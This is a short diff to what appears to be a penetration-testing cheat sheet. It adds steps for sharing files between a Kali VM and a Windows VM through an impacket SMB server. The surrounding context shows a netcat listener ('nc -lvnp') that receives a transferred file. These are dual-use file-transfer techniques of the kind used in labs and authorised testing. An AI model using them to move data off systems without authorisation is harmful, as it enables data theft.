@@ -206,6 +206,10 @@ On local host:
 nc -lvnp $LPORT > file
 ```
 
+### Between Kali VM and Windows VM
+On kali box: ```sudo impacket-smbserver -smb2support SHARENAME $(pwd)```\
+On Windows box: Run ```\\Kali's IP (Not VPN)\SHARENAME```\
+
 ### From Windows to local Kali machine using impacket-smbserver
 On local Kali machine:
 ```
